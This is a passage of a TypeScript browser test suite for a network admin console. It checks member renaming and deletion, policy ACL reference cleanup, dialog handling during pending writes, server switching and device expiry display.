  expect(summary(ctx)).toEqual(["DELETE /api/v1/user/1", "PUT /api/v1/policy"]);
  const saved = String(writes(ctx)[1]?.body.policy);
  expect(saved).not.toContain("alice");
  const policy = JSON.parse(saved);
  expect(policy.acls).toEqual([
    { action: "accept", src: ["bob@example.com"], dst: ["tag:server:22"] },
    { action: "accept", src: ["bob@example.com"], dst: ["tag:server:80"] },
  ]);
  expect(policy.ssh ?? []).toEqual([]);
});

// Catches an unsupported policy shape being rewritten, or blocking users it does not mention.
test("an unsupported policy shape blocks cleanup only for a user it mentions", async () => {
  const ctx = await setup("members", "", GRANTS_POLICY);
  releaseNodes(ctx, "1");
  releaseNodes(ctx, "2");
  await memberAction("delete", "alice");
  await expect
    .element(page.getByTestId("delete-member-policy-impact"))
    .toMatchTextContent(`${copy.policyReferenceUnsupported} grants[0].app`);
  await expect.element(page.getByTestId("confirm-delete-member")).toBeDisabled();
  await page.getByTestId("delete-member-cleanup-policy").click();
  await expect.element(page.getByTestId("confirm-delete-member")).toBeEnabled();
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("delete-member-dialog")).not.toBeInTheDocument();
  expect(summary(ctx)).toEqual(["DELETE /api/v1/user/1"]);
  await memberAction("delete", "bob");
  await expect.element(page.getByTestId("delete-member-dialog")).toBeVisible();
  await expect.element(page.getByTestId("delete-member-policy-impact")).not.toBeInTheDocument();
  await expect.element(page.getByTestId("confirm-delete-member")).toBeEnabled();
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("delete-member-dialog")).not.toBeInTheDocument();
  expect(summary(ctx)).toEqual(["DELETE /api/v1/user/1", "DELETE /api/v1/user/2"]);
});

// Catches the old group/tag-only rename leaving name@ in rules, and the email form being rewritten.
test("renaming a referenced member updates its policy references after the server rename", async () => {
  const ctx = await setup("members", "", RENAME_POLICY);
  await memberAction("rename", "alice");
  await expect.element(page.getByTestId("rename-member-policy-impact")).toBeVisible();
  expect(sectionRows("rename-member-policy-section")).toEqual(["acls"]);
  await expect
    .element(page.getByTestId("rename-member-update-policy"))
    .toHaveAttribute("aria-checked", "true");
  await page.getByTestId("rename-member-name").fill("alice2");
  await page.getByTestId("confirm-rename-member").click();
  await expect.element(page.getByTestId("rename-member-dialog")).not.toBeInTheDocument();
  expect(summary(ctx)).toEqual(["POST /api/v1/user/1/rename/alice2", "PUT /api/v1/policy"]);
  const policy = JSON.parse(String(writes(ctx)[1]?.body.policy));
  expect(policy.groups["group:ops"]).toEqual(["alice2@", "alice@example.com"]);
  expect(policy.acls[0].src).toEqual(["alice2@"]);
  await expect.element(page.getByTestId("member-alice2")).toBeVisible();
});

// Catches a failed policy step being hidden, or a retry that renames the user twice.
test("a failed reference update after the rename keeps a retry that sends only the policy write", async () => {
  const ctx = await setup("members", "", RENAME_POLICY);
  await memberAction("rename", "alice");
  await page.getByTestId("rename-member-name").fill("alice2");
  ctx.fail("Policy denied", "/api/v1/policy");
  await page.getByTestId("confirm-rename-member").click();
  await expect
    .element(page.getByTestId("rename-member-policy-error"))
    .toMatchTextContent("Policy denied");
  await expect.element(page.getByTestId("member-alice2")).toBeVisible();
  await expect
    .element(page.getByTestId("rename-member-policy-pending"))
    .toMatchTextContent(copy.renameMemberPolicyPending);
  await expect.element(page.getByTestId("confirm-rename-member")).toHaveTextContent("Try again");
  await expect.element(page.getByTestId("rename-member-cancel")).toHaveTextContent("Done");
  await expect.element(page.getByTestId("rename-member-name")).toBeDisabled();
  await expect.element(page.getByTestId("rename-member-update-policy")).toBeDisabled();
  ctx.fail("");
  await page.getByTestId("confirm-rename-member").click();
  await expect.element(page.getByTestId("rename-member-dialog")).not.toBeInTheDocument();
  expect(summary(ctx)).toEqual([
    "POST /api/v1/user/1/rename/alice2",
    "PUT /api/v1/policy",
    "PUT /api/v1/policy",
  ]);
  expect(JSON.parse(ctx.backend.policy?.policy ?? "{}").acls[0].src).toEqual(["alice2@"]);
});

// Catches the opt-out being ignored, and a block appearing for an unreferenced user.
test("rename leaves the policy alone when the option is off or nothing is referenced", async () => {
  const ctx = await setup("members", "", RENAME_POLICY);
  await memberAction("rename", "alice");
  await page.getByTestId("rename-member-update-policy").click();
  await page.getByTestId("rename-member-name").fill("alice2");
  await page.getByTestId("confirm-rename-member").click();
  await expect.element(page.getByTestId("rename-member-dialog")).not.toBeInTheDocument();
  expect(summary(ctx)).toEqual(["POST /api/v1/user/1/rename/alice2"]);
  await memberAction("rename", "bob");
  await expect.element(page.getByTestId("rename-member-policy-impact")).not.toBeInTheDocument();
  await page.getByTestId("rename-member-name").fill("bob2");
  await page.getByTestId("confirm-rename-member").click();
  await expect.element(page.getByTestId("rename-member-dialog")).not.toBeInTheDocument();
  expect(summary(ctx)).toEqual([
    "POST /api/v1/user/1/rename/alice2",
    "POST /api/v1/user/2/rename/bob2",
  ]);
});

// Catches a policy write after the server refused the rename.
test("a rejected rename sends no policy write", async () => {
  const ctx = await setup("members", "", RENAME_POLICY);
  await memberAction("rename", "alice");
  await page.getByTestId("rename-member-name").fill("alice2");
  ctx.fail("Rename denied");
  await page.getByTestId("confirm-rename-member").click();
  await expect.element(page.getByTestId("rename-member-error")).toMatchTextContent("Rename denied");
  await expect.element(page.getByTestId("rename-member-policy-pending")).not.toBeInTheDocument();
  expect(summary(ctx)).toEqual(["POST /api/v1/user/1/rename/alice2"]);
});

// Catches dismissing the dialog while the policy write is in flight.
test("the rename dialog cannot be dismissed while the policy write is held", async () => {
  const ctx = await setup("members", "", RENAME_POLICY);
  await memberAction("rename", "alice");
  await page.getByTestId("rename-member-name").fill("alice2");
  const release = ctx.pauseWrites("PUT");
  await page.getByTestId("confirm-rename-member").click();
  await expect.poll(() => ctx.calls.some((call) => call.method === "PUT")).toBe(true);
  await expect.element(page.getByTestId("rename-member-cancel")).toBeDisabled();
  await userEvent.keyboard("{Escape}");
  await expect.element(page.getByTestId("rename-member-dialog")).toBeVisible();
  release();
  await expect.element(page.getByTestId("rename-member-dialog")).not.toBeInTheDocument();
});

// Catches a node without a visible owner crashing the table or appearing under another member.
test("nodes owned by nobody or by the hidden tagged-devices user stay out of member rows", async () => {
  const ctx = await setup("members");
  const edge = ctx.backend.nodes[0];
  if (!edge) throw new Error("Missing fixture node");
  const unowned = { ...structuredClone(edge), id: "3" };
  delete unowned.user;
  const tagged = { ...structuredClone(edge), id: "4", user: { id: "0", name: "tagged-devices" } };
  ctx.backend.nodes.push(unowned, tagged);
  edge.givenName = "edge-renamed";
  await ctx.session.snapshot.refreshSnapshot();
  await expect
    .element(page.getByTestId("member-device-tag-alice-1"))
    .toMatchTextContent("edge-renamed");
  expect(
    Array.from(document.querySelectorAll('[data-testid^="member-device-tag-"]'), (button) =>
      button.getAttribute("data-testid"),
    ).sort(),
  ).toEqual(["member-device-tag-alice-1", "member-device-tag-bob-2"]);
});

// Base UI marks a dismissed popup data-closed at once but keeps it mounted through its exit
// transition, so presence alone cannot tell "still open" from "closing".
function isDialogOpen(testid: string) {
  return document.querySelector(`[data-testid="${testid}"]`)?.hasAttribute("data-open") === true;
}
// Catches Escape or a backdrop click closing the create dialog while its request is in flight.
test("the create dialog stays open until the member write settles", async () => {
  const ctx = await setup("members");
  await page.getByTestId("open-create-member").click();
  await page.getByTestId("member-name").fill("charlie");
  const release = ctx.pauseWrites("POST");
  await page.getByTestId("create-member").click();
  await expect.poll(() => summary(ctx)).toEqual(["POST /api/v1/user"]);
  await expect.element(page.getByTestId("cancel-create-member")).toBeDisabled();
  await userEvent.keyboard("{Escape}");
  expect(isDialogOpen("member-create-dialog")).toBe(true);
  release();
  await expect.element(page.getByTestId("member-create-dialog")).not.toBeInTheDocument();
  await expect.element(page.getByTestId("member-charlie")).toBeVisible();
  expect(summary(ctx)).toEqual(["POST /api/v1/user"]);
});

// Catches a crafted link opening a detail dialog for the user the table deliberately hides.
test("a deep link to the hidden tagged-devices user opens no detail dialog and loads nothing", async () => {
  const ctx = await setup("members");
  await ctx.router.navigate({ to: "/members", search: { user: "0", popup: "user" } });
  await expect.poll(() => ctx.router.state.location.search).toEqual({ user: "0", popup: "user" });
  // Typing re-renders the page after the navigation effects ran.
  await page.getByTestId("user-search").fill("alice");
  await expect.element(page.getByTestId("member-alice")).toBeVisible();
  expect(document.querySelector('[data-testid="user-detail-dialog"]')).toBeNull();
  expect(ctx.calls).toEqual([]);
});

// Catches typing in the rename field submitting, and a repeated Enter sending a second rename.
test("the rename field submits only on Enter and a repeated Enter while pending sends one request", async () => {
  const ctx = await setup("members");
  await memberAction("rename", "bob");
  await page.getByTestId("rename-member-name").fill("bob2");
  await userEvent.keyboard("x");
  await userEvent.keyboard("{Backspace}");
  await userEvent.keyboard("{Tab}");
  await expect.element(page.getByTestId("rename-member-dialog")).toBeVisible();
  expect(summary(ctx)).toEqual([]);
  await page.getByTestId("rename-member-name").click();
  const release = ctx.pauseWrites("POST");
  await userEvent.keyboard("{Enter}");
  await expect.poll(() => summary(ctx)).toEqual(["POST /api/v1/user/2/rename/bob2"]);
  await expect.element(page.getByTestId("confirm-rename-member")).toBeDisabled();
  await userEvent.keyboard("{Enter}");
  release();
  await expect.element(page.getByTestId("member-bob2")).toBeVisible();
  await expect.element(page.getByTestId("rename-member-dialog")).not.toBeInTheDocument();
  expect(summary(ctx)).toEqual(["POST /api/v1/user/2/rename/bob2"]);
});

// Catches an unchanged name, or a new name with the same name@ principal, still sending a policy write.
test("renaming a referenced member to its current name or principal sends no policy write", async () => {
  const ctx = await setup("members", "", RENAME_POLICY);
  await memberAction("rename", "alice");
  await expect.element(page.getByTestId("confirm-rename-member")).toBeDisabled();
  await page.getByTestId("rename-member-name").fill("alice@");
  await page.getByTestId("confirm-rename-member").click();
  await expect.element(page.getByTestId("rename-member-dialog")).not.toBeInTheDocument();
  expect(summary(ctx)).toEqual(["POST /api/v1/user/1/rename/alice%40"]);
});

// Catches a reference rewrite built from a policy that became unreadable while the rename was in flight.
test("a policy that turns unreadable during the rename is not rewritten", async () => {
  const ctx = await setup("members", "", RENAME_POLICY);
  await memberAction("rename", "alice");
  await page.getByTestId("rename-member-name").fill("alice2");
  const release = ctx.pauseWrites("POST");
  await page.getByTestId("confirm-rename-member").click();
  await expect.poll(() => summary(ctx)).toEqual(["POST /api/v1/user/1/rename/alice2"]);
  ctx.backend.policy = { policy: '{"acls":[' };
  release();
  await expect.poll(() => ctx.session.policy.getSnapshot().policyError).not.toBeNull();
  await expect.element(page.getByTestId("member-alice2")).toBeVisible();
  await expect.element(page.getByTestId("rename-member-dialog")).toBeVisible();
  expect(summary(ctx)).toEqual(["POST /api/v1/user/1/rename/alice2"]);
  expect(ctx.backend.policy.policy).toBe('{"acls":[');
});

// Catches newer Access edits made during the rename's policy write being lost or unreported.
test("newer edits made during the rename's policy write are preserved and reported", async () => {
  const ctx = await setup("members", "", RENAME_POLICY);
  await memberAction("rename", "alice");
  await page.getByTestId("rename-member-name").fill("alice2");
  const release = ctx.pauseWrites("PUT");
  await page.getByTestId("confirm-rename-member").click();
  await expect.poll(() => ctx.calls.some((call) => call.method === "PUT")).toBe(true);
  const state = ctx.session.policy.policyDesignerState;
  ctx.session.policy.commitState({
    ...state,
    extras: { ...state.extras, hosts: { newer: "10.96.0.0/16" } },
  });
  release();
  await expect.element(page.getByTestId("rename-member-dialog")).not.toBeInTheDocument();
  await expect
    .element(page.getByTestId("policy-save-notice"))
    .toMatchTextContent("Newer edits are still unsaved");
  await expect.element(page.getByTestId("member-alice2")).toBeVisible();
  expect(summary(ctx)).toEqual(["POST /api/v1/user/1/rename/alice2", "PUT /api/v1/policy"]);
  expect(ctx.session.policy.policyPayload?.hosts).toEqual({ newer: "10.96.0.0/16" });
});

// Catches a cleanup rebuilt from a policy that became unreadable while the DELETE was in flight.
test("a policy that turns unreadable during the delete is not rewritten", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  const release = ctx.pauseWrites("DELETE");
  await page.getByTestId("confirm-delete-member").click();
  await expect.poll(() => summary(ctx)).toEqual(["DELETE /api/v1/user/1"]);
  ctx.backend.policy = { policy: '{"groups":' };
  release();
  await expect.element(page.getByTestId("member-alice")).not.toBeInTheDocument();
  await expect.poll(() => ctx.session.policy.getSnapshot().policyError).not.toBeNull();
  await expect.element(page.getByTestId("delete-member-dialog")).toBeVisible();
  expect(summary(ctx)).toEqual(["DELETE /api/v1/user/1"]);
});

// The store changes after the last render but before the click; the live policy is the authority.
// One synchronous block: React has not yet disabled the button when the click lands.
test("a click that lands before the unreadable policy re-renders the dialog still sends nothing", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  await expect.element(page.getByTestId("confirm-delete-member")).toBeEnabled();
  const confirm = document.querySelector<HTMLButtonElement>(
    '[data-testid="confirm-delete-member"]',
  );
  if (!confirm) throw new Error("Missing confirm button");
  let started = false;
  ctx.session.feedback.subscribe(() => {
    if (ctx.session.feedback.isActionPending("delete-member")) started = true;
  });
  ctx.session.snapshot.applyPatch({ policy: { policy: '{"groups":' } });
  confirm.click();
  // The request starts synchronously inside the click, so this cannot race the network.
  expect(started).toBe(false);
  await expect.element(page.getByTestId("confirm-delete-member")).toBeDisabled();
  await expect.element(page.getByTestId("delete-member-dialog")).toBeVisible();
  expect(summary(ctx)).toEqual([]);
  await expect.element(page.getByTestId("member-alice")).toBeVisible();
});

// Same race for the two assignment menu items: a stale open flag would outlive the hidden dialog.
for (const kind of ["groups", "tags"] as const) {
  test(`a ${kind} assignment menu click before the unreadable policy re-renders opens nothing`, async () => {
    const ctx = await setup("members");
    await page.getByTestId("member-actions-trigger-bob").click();
    await expect.element(page.getByTestId(`assign-member-${kind}-bob`)).toBeVisible();
    const item = document.querySelector<HTMLElement>(`[data-testid="assign-member-${kind}-bob"]`);
    if (!item) throw new Error("Missing menu item");
    ctx.session.snapshot.applyPatch({ policy: { policy: '{"acls":[' } });
    item.click();
    await expect.element(page.getByTestId("members-policy-read-only")).toBeVisible();
    const open = kind === "groups" ? "assignMembershipsOpen" : "assignTagOwnershipsOpen";
    expect(ctx.session.policy.getSnapshot()[open]).toBe(false);
    expect(document.querySelector(`[data-testid="assign-user-${kind}-dialog"]`)).toBeNull();
    expect(summary(ctx)).toEqual([]);
  });
}

// Catches an empty name or missing email producing an empty or ambiguous machines link.
for (const [label, user] of [
  ["no email", { id: "5", name: "untagged-lab" }],
  ["neither email nor name", { id: "6", name: "", displayName: "Display Only" }],
] as const) {
  test(`a member with ${label} still gets a machines link`, async () => {
    const ctx = await setup("members");
    ctx.backend.users.push({ ...user });
    await ctx.session.snapshot.refreshSnapshot();
    await page.getByTestId(`member-actions-trigger-${user.name}`).click();
    await page.getByTestId(`view-member-machines-${user.name}`).click();
    await expect.poll(() => ctx.router.state.location.pathname).toBe("/devices");
    expect(ctx.router.state.location.search).toEqual({ user: user.id });
  });
}

test("a member without email or name is shown but cannot be assigned to groups or tags", async () => {
  const ctx = await setup("members");
  ctx.backend.users.push({ id: "6", name: "", displayName: "Display Only" });
  await ctx.session.snapshot.refreshSnapshot();
  await expect.element(page.getByTestId("member-detail-link-")).toHaveTextContent("Display Only");
  await page.getByTestId("member-actions-trigger-").click();
  await expect
    .element(page.getByTestId("assign-member-groups-"))
    .toHaveAttribute("aria-disabled", "true");
  await expect
    .element(page.getByTestId("assign-member-tags-"))
    .toHaveAttribute("aria-disabled", "true");
  expect(summary(ctx)).toEqual([]);
});

test("a member without an email shows the list placeholder in its details", async () => {
  const ctx = await setup("members");
  ctx.backend.users.push({ id: "5", name: "untagged-lab" });
  await ctx.session.snapshot.refreshSnapshot();
  await page.getByTestId("member-detail-link-untagged-lab").click();
  await expect
    .element(page.getByTestId("user-detail-dialog"))
    .toMatchTextContent(`${copy.email}: -`);
});

// Catches the reference list or its "no references" text claiming a state the unreadable policy cannot know.
test("member details with an unreadable policy show only the blocked message", async () => {
  await setup("members", "?user=1&popup=user", '{"acls":[');
  const dialog = page.getByTestId("user-detail-dialog");
  await expect.element(dialog).toMatchTextContent(copy.policyReadOnlyError);
  const text = String(document.querySelector('[data-testid="user-detail-dialog"]')?.textContent);
  expect(text).not.toContain(copy.noPolicyReferences);
  expect(document.querySelector('[data-testid^="remove-user-policy-reference-"]')).toBeNull();
});

// Catches the opening refresh leaving no owner when every visible user has disappeared.
test("the invite owner falls back to no owner when no visible user remains", async () => {
  const ctx = await setup("members");
  const release = ctx.pause();
  await page.getByTestId("member-actions-trigger-bob").click();
  await page.getByTestId("create-invite-for-member-bob").click();
  ctx.backend.users = ctx.backend.users.filter((user) => user.id === "0");
  release();
  await expect.element(page.getByTestId("invite-user")).toHaveValue("");
  await page.getByTestId("invite-tags").fill("tag:client");
  await page.getByTestId("create-invite").click();
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/invites");
  expect(summary(ctx)).toEqual(["POST /api/v1/preauthkey"]);
  expect(writes(ctx)[0]?.body.user).toBeFalsy();
});

// Catches Escape or a backdrop click discarding the invite dialog while its key is being created.
test("the invite dialog stays open until the key write settles", async () => {
  const ctx = await setup("members");
  await openMemberInvite(ctx);
  const release = ctx.pauseWrites("POST");
  await page.getByTestId("create-invite").click();
  await expect.poll(() => summary(ctx)).toEqual(["POST /api/v1/preauthkey"]);
  await userEvent.keyboard("{Escape}");
  expect(isDialogOpen("invite-create-dialog")).toBe(true);
  release();
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/invites");
  expect(summary(ctx)).toEqual(["POST /api/v1/preauthkey"]);
});

// Catches Members publishing, through its whole-policy write, edits the admin has not saved.
test("unsaved Access edits block every Members policy write but not the user operations", async () => {
  const policyText = JSON.stringify({
    groups: { "group:ops": ["alice@", "bob@"] },
    tagOwners: { "tag:server": ["alice@"] },
    acls: [],
  });
  const ctx = await setup("members", "?user=1&popup=user", policyText);
  await expect.element(page.getByTestId("user-detail-dialog")).toMatchTextContent("ready-key");
  await expect.poll(() => ctx.session.snapshot.isRefreshing).toBe(false);
  makeDirty(ctx);
  await expect
    .element(page.getByTestId("members-policy-unsaved"))
    .toMatchTextContent(copy.policyUnsavedBlocked);
  const removers = document.querySelectorAll<HTMLButtonElement>(
    '[data-testid^="remove-user-policy-reference-"]',
  );
  expect(removers.length).toBeGreaterThan(0);
  for (const remove of removers) expect(remove.disabled).toBe(true);
  await userEvent.keyboard("{Escape}");
  await page.getByTestId("member-actions-trigger-alice").click();
  for (const item of ["assign-member-groups-alice", "assign-member-tags-alice"])
    await expect.element(page.getByTestId(item)).toHaveAttribute("aria-disabled", "true");
  await userEvent.keyboard("{Escape}");
  await memberAction("rename", "bob");
  await expect.element(page.getByTestId("rename-member-update-policy")).toBeDisabled();
  await expect
    .element(page.getByTestId("rename-member-update-policy"))
    .toHaveAttribute("aria-checked", "false");
  await page.getByTestId("rename-member-name").fill("bob2");
  await page.getByTestId("confirm-rename-member").click();
  await expect.element(page.getByTestId("rename-member-dialog")).not.toBeInTheDocument();
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  await expect
    .element(page.getByTestId("delete-member-policy-impact"))
    .toMatchTextContent(copy.policyUnsavedBlocked);
  await expect.element(page.getByTestId("confirm-delete-member")).toBeDisabled();
  await page.getByTestId("delete-member-cleanup-policy").click();
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("delete-member-dialog")).not.toBeInTheDocument();
  expect(summary(ctx)).toEqual(["POST /api/v1/user/2/rename/bob2", "DELETE /api/v1/user/1"]);
  expect(ctx.backend.policy?.policy).toBe(policyText);
  await page.viewport(390, 640);
  await page.getByTestId("member-actions-trigger-mobile-bob2").click();
  for (const item of ["assign-member-groups-mobile-bob2", "assign-member-tags-mobile-bob2"])
    await expect.element(page.getByTestId(item)).toHaveAttribute("aria-disabled", "true");
});

// Catches the block outliving the unsaved edit, or the assignment carrying the discarded edit.
test("discarding the Access edits re-enables Members policy writes with only the intended change", async () => {
  const ctx = await setup("members");
  makeDirty(ctx);
  await expect.element(page.getByTestId("members-policy-unsaved")).toBeInTheDocument();
  discardDraft(ctx);
  await expect.element(page.getByTestId("members-policy-unsaved")).not.toBeInTheDocument();
  await page.getByTestId("member-actions-trigger-bob").click();
  await expect
    .element(page.getByTestId("assign-member-groups-bob"))
    .not.toHaveAttribute("aria-disabled", "true");
  await page.getByTestId("assign-member-groups-bob").click();
  const home = Array.from(
    document.querySelectorAll<HTMLElement>('[data-testid^="assign-user-groups-option-"]'),
  ).find((option) => option.textContent?.includes("group:home"));
  if (!home) throw new Error("Missing group:home option");
  home.click();
  await page.getByTestId("assign-user-groups-apply").click();
  await expect.element(page.getByTestId("assign-user-groups-dialog")).not.toBeInTheDocument();
  expect(summary(ctx)).toEqual(["PUT /api/v1/policy"]);
  const saved = JSON.parse(String(writes(ctx)[0]?.body.policy));
  expect(saved.hosts).toBeUndefined();
  expect(saved.groups["group:home"]).toEqual(["bob@example.com"]);
});

// Catches a delete or cleanup landing on the server the admin switched to while it was in flight.
test("switching servers during a held delete or cleanup write sends nothing to the new server", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  const releaseDelete = ctx.pauseWrites("DELETE");
  await page.getByTestId("confirm-delete-member").click();
  await expect.poll(() => ctx.calls.some((call) => call.method === "DELETE")).toBe(true);
  await authenticateTestSession(ctx.session, "https://other.invalid");
  releaseDelete();
  await expect.poll(() => ctx.session.snapshot.isRefreshing).toBe(false);
  expect(summary(ctx)).toEqual(["DELETE /api/v1/user/1"]);
});

test("switching servers during a held cleanup write leaves the new server's draft alone", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  const releasePut = ctx.pauseWrites("PUT");
  await page.getByTestId("confirm-delete-member").click();
  await expect.poll(() => ctx.calls.some((call) => call.method === "PUT")).toBe(true);
  await authenticateTestSession(ctx.session, "https://other.invalid");
  await expect.poll(() => ctx.session.snapshot.isRefreshing).toBe(false);
  releasePut();
  await expect.poll(() => ctx.session.feedback.isActionPending("save-policy")).toBe(false);
  expect(summary(ctx)).toEqual(["DELETE /api/v1/user/1", "PUT /api/v1/policy"]);
  expect(ctx.session.policy.getSnapshot().policyDraft).toContain("alice@example.com");
  expect(ctx.session.policy.isPolicyDirty).toBe(false);
});

// Catches per-row device loss.
test("a user's devices all appear in its row", async () => {
  const ctx = await setup("members");
  const source = ctx.backend.nodes[0];
  if (!source) throw new Error("Missing fixture node");
  ctx.backend.nodes.push({ ...source, id: "3", name: "edge2", givenName: "edge-two" });
  ctx.session.snapshot.applyPatch({ nodes: structuredClone(ctx.backend.nodes) });
  await expect.element(page.getByTestId("member-device-tag-alice-3")).toBeInTheDocument();
  const tags = document.querySelector('[data-testid="member-device-tags-alice"]');
  expect(tags?.querySelector('[data-testid="member-device-tag-alice-1"]')).not.toBeNull();
  expect(tags?.querySelector('[data-testid="member-device-tag-alice-3"]')).not.toBeNull();
});

// Catches an unnamed table, indistinguishable remove buttons, and untested reference rows.
test("the members table is named and each reference remove button names its reference", async () => {
  await setup("members", "?user=1&popup=user");
  await expect.element(page.getByTestId("user-detail-dialog")).toMatchTextContent("ready-key");
  expect(document.querySelector("[data-testid^='user-policy-reference-group-']")).not.toBeNull();
  expect(document.querySelector("[data-testid^='user-policy-reference-tagOwner-']")).not.toBeNull();
  const names = Array.from(
    document.querySelectorAll<HTMLElement>("[data-testid^='remove-user-policy-reference-']"),
    (button) => button.getAttribute("aria-label"),
  );
  expect(names.length).toBeGreaterThanOrEqual(2);
  expect(new Set(names).size).toBe(names.length);
  for (const name of names) expect(name).toContain(copy.removeFromReference);
  await userEvent.keyboard("{Escape}");
  await expect.element(page.getByRole("table", { name: copy.membersTitle })).toBeInTheDocument();
  await page.getByTestId("member-detail-link-bob").click();
  await expect
    .element(page.getByTestId("user-detail-dialog"))
    .toMatchTextContent(copy.noPolicyReferences);
});

// Catches the node address reordering in a right-to-left locale ("0/::" symptom).
test("member detail node addresses stay left-to-right in Arabic", async () => {
  await setup("members", "?user=1&popup=user");
  await expect.element(page.getByTestId("user-detail-device-1")).toBeVisible();
  await setLocale("ar");
  try {
    const dialog = document.querySelector('[data-testid="user-detail-dialog"]');
    if (!dialog) throw new Error("Missing detail dialog");
    expectNetworkTokensLtr(dialog, 2);
  } finally {
    await setLocale("en-US");
  }
});

// Catches an assignment error surviving the dialog and reappearing on the next open.
for (const kind of ["groups", "tags"] as const) {
  test(`a failed ${kind} assignment error is gone after closing and reopening the dialog`, async () => {
    const ctx = await setup("members");
    const open = async () => {
      await page.getByTestId("member-actions-trigger-bob").click();
      await page.getByTestId(`assign-member-${kind}-bob`).click();
    };
    await open();
    document
      .querySelector<HTMLButtonElement>(`[data-testid^="assign-user-${kind}-option-"]`)
      ?.click();
    ctx.fail("Policy denied");
    await page.getByTestId(`assign-user-${kind}-apply`).click();
    await expect
      .element(page.getByTestId(`assign-user-${kind}-error`))
      .toMatchTextContent("Policy denied");
    await page.getByTestId(`assign-user-${kind}-cancel`).click();
    await expect.element(page.getByTestId(`assign-user-${kind}-dialog`)).not.toBeInTheDocument();
    expect(ctx.session.feedback.actionError(`assign-user-${kind}`)).toBe("");
    await open();
    await expect.element(page.getByTestId(`assign-user-${kind}-dialog`)).toBeVisible();
    await expect.element(page.getByTestId(`assign-user-${kind}-error`)).not.toBeInTheDocument();
  });
}

// Devices page expiry correctness, dialog hygiene and auth-key wizard.
const ZERO_TIME = "0001-01-01T00:00:00Z";
function spareNode(ctx: Awaited<ReturnType<typeof setup>>, patch: Record<string, unknown>) {
  const source = ctx.backend.nodes[1];
  if (!source) throw new Error("Missing fixture node");
  return { ...source, ...patch } as (typeof ctx.backend.nodes)[number];
}
function pushNodes(ctx: Awaited<ReturnType<typeof setup>>) {
  ctx.session.snapshot.applyPatch({ nodes: structuredClone(ctx.backend.nodes) });
}
const GETS_OF_NODES = (ctx: Awaited<ReturnType<typeof setup>>) =>
  ctx.calls.filter((c) => c.method === "GET" && c.path === "/api/v1/node").length;

// Catches Go zero timestamps rendering as a long-past expiry.
test("a zero expiry reads Never and is neither expired nor exported", async () => {
  const ctx = await setup("devices");
  ctx.backend.nodes.push(spareNode(ctx, { id: "3", name: "zero", expiry: ZERO_TIME }));
  await page.getByTestId("refresh-machines").click();
  await expect.element(page.getByTestId("device-status-3")).toHaveTextContent("Offline");
  await expect.element(page.getByTestId("device-3")).toMatchTextContent("Expires: Never");
  await page.getByTestId("machine-filter").selectOptions("expired");
  await expect.element(page.getByTestId("device-3")).not.toBeInTheDocument();
  await page.getByTestId("machine-filter").selectOptions("all");
  await page.getByTestId("device-detail-link-3").click();
  await expect
    .element(page.getByTestId("device-detail-dialog"))
    .toMatchTextContent("Expires: Never");
});

// Catches an expiry instant that passes without any re-render.
test("an offline node turns Expired when its expiry passes, without another request", async () => {
  const ctx = await setup("devices");
  const node = ctx.backend.nodes[1];
  if (!node) throw new Error("Missing fixture node");
  node.expiry = new Date(Date.now() + 700).toISOString();
  pushNodes(ctx);
  await expect.element(page.getByTestId("device-status-2")).toHaveTextContent("Offline");
  const before = GETS_OF_NODES(ctx);
  await expect
    .poll(() => document.querySelector('[data-testid="device-status-2"]')?.textContent, {
      timeout: 3000,
    })
    .toBe("Expired");
  expect(GETS_OF_NODES(ctx)).toBe(before);
});

// Catches the status filters disagreeing with the status badge and the counts.
test("machine filters list exactly the nodes whose badge shows that status", async () => {
  const ctx = await setup("devices");
  const [online, offline] = ctx.backend.nodes;
  if (!online || !offline) throw new Error("Missing fixture nodes");
  online.expiry = "2000-01-01T00:00:00Z";
  ctx.backend.nodes.push(
    spareNode(ctx, { id: "3", name: "future", expiry: "2099-01-01T00:00:00Z" }),
  );
  pushNodes(ctx);
  const expected = { online: ["1"], offline: ["3"], expired: ["2"] };
  let total = 0;
  for (const [status, ids] of Object.entries(expected)) {
    await page.getByTestId("machine-filter").selectOptions(status);
    await expect
      .poll(() =>
        Array.from(document.querySelectorAll("[data-testid^='device-status-']"), (badge) =>
          badge.getAttribute("data-testid"),
        ),
      )
      .toEqual(ids.map((id) => `device-status-${id}`));
    const label = status.charAt(0).toUpperCase() + status.slice(1);
    for (const id of ids)
      await expect.element(page.getByTestId(`device-status-${id}`)).toHaveTextContent(label);
    total += ids.length;
  }
  expect(total).toBe(ctx.backend.nodes.length);
});

// Catches a client clock being sent as the expiry instant.
test("expiring a machine sends no client time", async () => {
  const ctx = await setup("devices");
  await deviceAction("expire", "1");
  await page.getByTestId("expire-node-confirm").click();
  await expect.element(page.getByTestId("expire-node-dialog")).not.toBeInTheDocument();
  expect(writes(ctx)).toEqual([{ method: "POST", path: "/api/v1/node/1/expire", body: {} }]);
});

// Catches an invisible dialog whose draft still blocks server switching.
test.each(["expire", "remove"])(
  "the %s dialog closes and releases its draft when the node vanishes during the opening refresh",
  async (action) => {
    const ctx = await setup("devices");
    const release = ctx.pause();
    await deviceAction(action, "1");
    await expect.element(page.getByTestId(`${action}-node-dialog`)).toBeVisible();
    ctx.backend.nodes = ctx.backend.nodes.filter((n) => n.id !== "1");
    release();
    await expect.element(page.getByTestId(`${action}-node-dialog`)).not.toBeInTheDocument();
    expect(ctx.session.drafts.hold({ id: "p", name: "P" })).toBe(false);
    expect(writes(ctx)).toEqual([]);
  },
);

// Catches a pending write losing its dialog because the row disappeared.
test("a held expire write keeps its dialog until it settles", async () => {
  const ctx = await setup("devices");
  await deviceAction("expire", "1");
  const release = ctx.pauseWrites("POST");
  await page.getByTestId("expire-node-confirm").click();
  await expect.poll(() => writes(ctx).length).toBe(1);
  ctx.session.snapshot.applyPatch({ nodes: structuredClone(ctx.backend.nodes.slice(1)) });
  await expect.element(page.getByTestId("expire-node-dialog")).toBeVisible();
  release();
